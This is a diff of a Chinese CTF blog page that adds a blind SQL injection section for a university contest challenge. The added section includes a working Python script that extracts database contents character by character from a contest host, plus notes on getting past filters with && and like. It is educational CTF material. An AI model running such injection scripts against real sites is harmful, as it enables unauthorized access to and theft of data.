@@ -14,7 +14,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.imgur.com/i1AJFAu.png">
 <meta property="og:image" content="https://i.imgur.com/pNMfXgg.png">
-<meta property="og:updated_time" content="2017-09-02T05:48:05.836Z">
+<meta property="og:updated_time" content="2017-11-06T05:02:05.481Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="blind_SQL_injection script">
 <meta name="twitter:description" content="就是突然觉得收集一些脚本，而不是丢掉，这样会让自己做题效率高很多，所以把作过的题目的脚本都收集起来吧。">
@@ -211,6 +211,8 @@
 </ol>
 <p>这里发现了mysql一个神奇的地方，就是字符串在进行运算的时候，会和php一样自动变成数字，比如’admin’-‘-1’的结果会是1,<img src="https://i.imgur.com/i1AJFAu.png" alt=""><img src="https://i.imgur.com/pNMfXgg.png" alt="">详情参考php，而且我还去试了下把username这一元素改成int类型，发现还是一样的结果</p>
 <p>猜测后台脚本应该是先判断用户名，再判断密码。所以上面这个脚本如果命中的话，<strong><code>查询结果会把所有不以数字开头的用户名都返回</code></strong>，然后返回密码错误。如果没命中的话，就会返回用户名错误</p>
+<h1 id="第三届上海大学生网络安全赛盲注题"><a href="#第三届上海大学生网络安全赛盲注题" class="headerlink" title="第三届上海大学生网络安全赛盲注题"></a>第三届上海大学生网络安全赛盲注题</h1><p>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#coding:utf-8</div><div class="line"></div><div class="line">import requests</div><div class="line">import urllib</div><div class="line">def exp(i,x):</div><div class="line">	url = &apos;http://0d2c92830f414f70ae4739aa450aec00fd79f6f552734def.game.ichunqiu.com/index.php?id=&apos;</div><div class="line">	#xx= &quot;1+%26%26+ascii(substring((select+database())+from+&quot;+str(i)+&quot;+for+1))-&quot;+str(x)</div><div class="line">	#xx = &quot;1+%26%26+ascii(substring((select+table_name+from+information_schema.columns+where+table_schema+like+database()+limit+1)+from+&quot;+str(i)+&quot;+for+1))-&quot;+str(x)</div><div class="line">	#xx = &quot;1+%26%26+ascii(substring((select+column_name+from+information_schema.columns+where+table_name+like+%22f14g%22+limit+1)+from+&quot;+str(i)+&quot;+for+1))-&quot;+str(x)</div><div class="line">	xx = &quot;1+%26%26+ascii(substring((select+f14g+from+words.f14g)+from+&quot;+str(i)+&quot;+for+1))-&quot;+str(x)</div><div class="line"></div><div class="line">	u=url+xx</div><div class="line">	#print u</div><div class="line">	response = requests.get(url=u)</div><div class="line">	#print response.content</div><div class="line">	if response.content.find(&apos;Hello Hacker!!&apos;)&gt;0:</div><div class="line">	return 0</div><div class="line">	else :</div><div class="line">	return 1</div><div class="line"></div><div class="line">ans=&apos;&apos;</div><div class="line"></div><div class="line">print &apos;star&apos;</div><div class="line">for i in range(1,100):</div><div class="line">	for x in range(32,127):</div><div class="line">		if exp(i,x)==1:</div><div class="line">			ans+=chr(x)</div><div class="line">			print ans</div><div class="line">			break</div></pre></td></tr></table></figure></p>
+<p>过滤了<strong>and</strong>和<strong>=</strong>，<strong>and</strong>用<strong>&amp;&amp;</strong>来代替，<strong>=</strong>用<strong>like</strong>来代替</p>
 <p>以上就是一些没有过滤的时候的盲注脚本，以后会陆续添加有一些过滤的脚本</p>
 
       
@@ -270,7 +272,7 @@
         <p><span>本文标题:</span><a href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Err0r 的个人博客">Err0r</a></p>
         <p><span>发布时间:</span>2017年08月25日 - 19时22分</p>
-        <p><span>最后更新:</span>2017年09月02日 - 13时48分</p>
+        <p><span>最后更新:</span>2017年11月06日 - 13时02分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/08/25/blind-SQL-injection-script/" title="blind_SQL_injection script">http://Err0rzz.github.io/2017/08/25/blind-SQL-injection-script/</a>
             <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/08/25/blind-SQL-injection-script/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -303,7 +305,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的盲注脚本，根据错误信息判断"><span class="toc-number">1.</span> <span class="toc-text">简单的盲注脚本，根据错误信息判断</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#布尔语句的盲注脚本"><span class="toc-number">2.</span> <span class="toc-text">布尔语句的盲注脚本</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的盲注脚本，根据错误信息判断"><span class="toc-number">1.</span> <span class="toc-text">简单的盲注脚本，根据错误信息判断</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#布尔语句的盲注脚本"><span class="toc-number">2.</span> <span class="toc-text">布尔语句的盲注脚本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第三届上海大学生网络安全赛盲注题"><span class="toc-number">3.</span> <span class="toc-text">第三届上海大学生网络安全赛盲注题</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -378,7 +380,7 @@
             <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/updatexml-mysql显错注入/">updatexml mysql显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/26/typecho-backdoor/">typecho backdoor</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/问鼎杯决赛/">问鼎杯决赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/常用正则表达式/">常用正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/hash长度扩展攻击/">hash长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/jarvisoj/">javrisoj的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/04/injection/">各种注入姿势</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/file_include/">文件包含一些常识</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/updatexml-mysql显错注入/">updatexml mysql显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/26/typecho-backdoor/">typecho backdoor</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/问鼎杯决赛/">问鼎杯决赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/常用正则表达式/">常用正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/hash长度扩展攻击/">hash长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/16/问鼎杯线上/">问鼎杯writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/jarvisoj/">javrisoj的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/04/injection/">各种注入姿势</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/file_include/">文件包含一些常识</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></li></ul>
     <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
     <script>
         $(".post-list").addClass("toc-article");
